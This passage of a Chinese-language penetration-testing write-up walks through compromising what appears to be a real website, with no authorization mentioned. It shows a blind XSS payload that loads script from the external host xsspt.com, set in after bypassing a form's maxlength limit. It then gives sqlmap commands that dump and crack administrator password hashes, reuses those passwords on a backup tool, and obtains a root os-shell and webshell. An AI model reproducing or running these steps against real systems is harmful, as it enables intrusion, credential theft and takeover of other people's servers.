**二、XSS盲打？安排一下**

  

![](../Images/8096ce4403379ff558289db30581bc41.png)

  

看到这里，小伙伴们肯定想。。。emm，发挥有框就插的精神，是不是可以XSS打一下试试呢？（所谓盲打说白了就是在不知道输入的信息在后台的输出位置的情况下使用XSS利用代码进行渗透测试）   说干咱就干。。。接下来就插入xss payload试试吧。。。

  

Payload: </textarea><script src=”=”http://xsspt.com/z6ocdy?1531815744″></script>

  

将payload完整黏贴进去，如图发现仅有</tex    这四个字符

  

![](../Images/77f61a0eac5ff14d221ec219cd1e680f.png)

  

审查元素看下，在表单处理上设置了maxlength，直接审查元素大法改掉就好了

  

![](../Images/4323e8f7c1e0d69758fe3527cc7bc744.png)

  

把maxlength编辑为9

  

![](../Images/6d19406401ed9ac0262fb65125854fda.png)

  

然后我们的XSS Payload就可以正常地全部输入到表单中了

  

![](../Images/bff568143351915312bdb70b84782235.png)

  

手机那个文本框，我随便填了11位数字，然后点击提交，万幸的的是提交成功了（后端没对内容进行验证）

**三、后台SQL注入？****讲究**

  

![](../Images/a4b5757e06cda20b87434956d8f76f42.png)

  

大家可以看到我们的客服处理界面是可以进行查询的，查询的过程是通过GET方式传导一个mobile参数实现查询

  

我们直接测试一下SQL注入的Payload，看看是否存在注入。发现页面没有返回信息，那么就很有可能存在SQL注入。

  

![](../Images/57181e305fcdc7d8e36ded42c08b70e4.png)

  

我们使用BurpSuite来抓取本出的的HTTP请求，然后保存在C:\\Users\\Samsung 700Z5C\\Desktop\\1.txt中

  

 ![](../Images/c9834937daffc9a841424cf818e0edfb.png) 

  

接下来到了以小勃大，紧张刺激的时刻，掏出大宝贝，使用SQLMAP的 -r参数，注入本HTTP请求

  

命令为sqlmap -r C:\\Users\\Samsung 700Z5C\\Desktop\\1.txt

  

 ![](../Images/216003938371b9042ef113ade496ca73.png) 

  

wow,wow~注入成功了。哈哈哈。。。。我们开始直奔管理员的表

  

命令为sqlmap -r C:\\Users\\Samsung 700Z5C\\Desktop\\1.txt –tables -D “nd\_net”      //列出nd\_net数据库的表

  

 ![](../Images/1a7a9a3677e2ace7351d7c3294f02015.png) 

  

然后执行

  

sqlmap -r C:\\Users\\Samsung 700Z5C\\Desktop\\1.txt –columns -T “net\_admin\_user” -D “nd\_net”   //列出net\_admin\_user表的字段

  

最后执行命令

  

sqlmap.py -r “I:\\T00l\\1.txt” –dump -C “id,nd\_user,userid,nd\_pass” -T “net\_admin\_user” -D “nd\_net” –threads=10   

  

//导出net\_admin\_user表中id,nd\_user,userid,nd\_pass几个字段的数据

  

 ![](../Images/de4c0076f7f1a6f6b3aa6dd19d16eb8c.png) 

  

全部是md5加密，拿到cmd5，一波解密，成功获取到所有管理员的账号密码，然后成功登陆以管理员的权限登陆后台

  

![](../Images/fde77f2fc175caad86e43af28596ff1c.png)

  

哈哈，讲究！

**四、不拿Shell，与咸鱼有什么区别？**

  

emm，就算是管理员的权限。我发现可以利用的地方依然很少，只有一些静态页面的编辑权限（而且编辑器是KindEditor，没什么方法上传拿Shell）,我当时十分绝望。。。但是我发现了这个——数据库备份

  

![](../Images/9cf18ceb398c6e6f1f0be7a5248cd1a4.png)

  

点击后，跳转到一款叫做“帝国备份王”的程序

  

![](../Images/1f2a2c56450e9585145854777e85d6f5.png)

  

随后，我便去该程序的官网，下载了一个帮助文档。使用默认用户admin/123456进行登陆，但是以失败告终。

  

但我怎末可能放弃，我一个一个测试了之前后台SQL注入得到的密码（有验证码，没法爆破的），最终在一个密码上成功地登陆了。。。我靠，高兴死我。。。。。。。。

  

   ![](../Images/eed90b67c55bae308297174dd7fb4cf0.png) 

  

发现了一个PHP探针

  

 ![](../Images/cb6099e911645a5c42d93aa60c7e08f8.png) 

  

再掏出SQLMAP，直接使用命令 sqlmap -r C:\\Users\\Samsung 700Z5C\\Desktop\\1.txt –os-shell   //获取shell

  

 ![](../Images/ad75c8fe5fb4a07dc0265363849b44d3.png)

  

输入我们通过探针得到的路径，很幸运，ROOT权限直接os-shell成功。直接上一句话，GetShell完美结束

  

![](../Images/7f2ca88fc49ee2a2967b03cdf377f57a.png)
